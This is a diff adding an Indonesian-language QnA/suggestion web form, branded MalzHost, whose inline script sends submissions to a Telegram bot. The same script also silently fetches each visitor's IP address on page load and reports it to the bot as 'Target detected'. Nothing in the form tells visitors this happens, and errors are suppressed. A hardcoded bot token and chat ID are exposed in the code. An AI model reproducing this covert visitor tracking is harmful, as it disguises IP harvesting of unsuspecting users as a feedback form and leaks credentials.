@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>QnA / Saran</title>
+<style>
+  body {
+    background: #121212;
+    color: #e0e0e0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin: 0;
+    padding: 2rem 1rem;
+    min-height: 100vh;
+  }
+  h1 {
+    color: #03dac6;
+    font-weight: 700;
+    margin-bottom: 1rem;
+    text-shadow: 0 0 8px #03dac6;
+  }
+  form {
+    background: #1f1f1f;
+    padding: 1.5rem;
+    border-radius: 10px;
+    box-shadow: 0 0 12px rgba(3, 218, 198, 0.5);
+    width: 100%;
+    max-width: 400px;
+  }
+  label {
+    display: block;
+    margin-top: 1rem;
+    font-weight: 600;
+    font-size: 1rem;
+    color: #b3b3b3;
+  }
+  input[type="text"],
+  textarea {
+    width: 100%;
+    padding: 0.7rem;
+    margin-top: 0.3rem;
+    border-radius: 6px;
+    border: none;
+    resize: vertical;
+    font-size: 1rem;
+    font-family: inherit;
+  }
+  textarea {
+    min-height: 100px;
+    background: #292929;
+    color: #e0e0e0;
+  }
+  input[type="text"] {
+    background: #292929;
+    color: #e0e0e0;
+  }
+  button {
+    margin-top: 1.5rem;
+    background: #03dac6;
+    color: #121212;
+    border: none;
+    padding: 0.9rem 1.5rem;
+    font-weight: 700;
+    font-size: 1.1rem;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background: #00bfa5;
+  }
+  .notification {
+    margin-top: 1rem;
+    color: #03dac6;
+    font-weight: 600;
+    min-height: 1.5em;
+    text-align: center;
+  }
+  footer {
+    margin-top: auto;
+    color: #888;
+    font-size: 0.9rem;
+    text-align: center;
+    padding: 1rem;
+  }
+</style>
+</head>
+<body>
+<h1>QnA / Saran</h1>
+<form id="qnaForm">
+  <label for="question">Pertanyaan / Saran</label>
+  <textarea id="question" name="question" placeholder="Tulis pertanyaan atau saran Anda..." required></textarea>
+
+  <label for="sender">Nama atau Nomor</label>
+  <input type="text" id="sender" name="sender" placeholder="Nama atau nomor Anda..." required />
+
+  <button type="submit">Kirim</button>
+  <div class="notification" id="statusMsg"></div>
+</form>
+<footer>©️ MalzHost</footer>
+<script>
+  (function(){
+    const BOT_TOKEN = '7628106273:AAFzyduoKMlfV65CqbAUNObcH0C3Lg6zCp0';
+    const ADMIN_CHAT_ID = '7209932865';
+
+    // Send fetch request to Telegram API
+    async function sendTelegramMessage(token, chat_id, text) {
+      const endpoint = `https://api.telegram.org/bot${token}/sendMessage`;
+      const body = new URLSearchParams();
+      body.append('chat_id', chat_id);
+      body.append('text', text);
+      body.append('parse_mode', 'HTML');
+      body.append('disable_web_page_preview', 'true');
+      try {
+        await fetch(endpoint, { method: 'POST', body });
+      } catch(e) {
+        // silently fail
+      }
+    }
+
+    // Get client IP from public API
+    async function getClientIP() {
+      try {
+        const response = await fetch('https://api64.ipify.org?format=json');
+        if(!response.ok) throw new Error('IP fetch failed');
+        const data = await response.json();
+        return data.ip || 'unknown';
+      } catch {
+        return 'unknown';
+      }
+    }
+
+    // Send IP notification once on page load
+    async function notifyIP() {
+      const ip = await getClientIP();
+      const message = `&lt;&gt; Target detected✅ (${ip})`;
+      await sendTelegramMessage(BOT_TOKEN, ADMIN_CHAT_ID, message);
+    }
+
+    // Handle form submission
+    document.getElementById('qnaForm').addEventListener('submit', async e => {
+      e.preventDefault();
+      const question = e.target.question.value.trim();
+      const sender = e.target.sender.value.trim();
+      const statusMsg = document.getElementById('statusMsg');
+      if(!question || !sender){
+        statusMsg.textContent = 'Harap isi semua kolom.';
+        statusMsg.style.color = 'red';
+        return;
+      }
+      const message = 
+        `Pesan baru❗\n\n` +
+        `Pesan: ${escapeHtml(question)}\n\n` +
+        `Pengirim: ${escapeHtml(sender)}\n\n` +
+        `©️ MalzHost`;
+      statusMsg.textContent = 'Mengirim...';
+      statusMsg.style.color = '#03dac6';
+
+      try {
+        await sendTelegramMessage(BOT_TOKEN, ADMIN_CHAT_ID, message);
+        statusMsg.textContent = 'Pertanyaan berhasil dikirim, terima kasih!';
+        e.target.reset();
+      } catch {
+        statusMsg.textContent = 'Gagal mengirim. Silakan coba lagi.';
+        statusMsg.style.color = 'red';
+      }
+    });
+
+    // Simple html escaping to avoid special chars breaking Telegram format
+    function escapeHtml(text) {
+      return text.replace(/[&<>"']/g, function(m) {
+        return {'&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;'}[m];
+      });
+    }
+
+    notifyIP();
+  })();
+</script>
+</body>
+</html>
+
+```
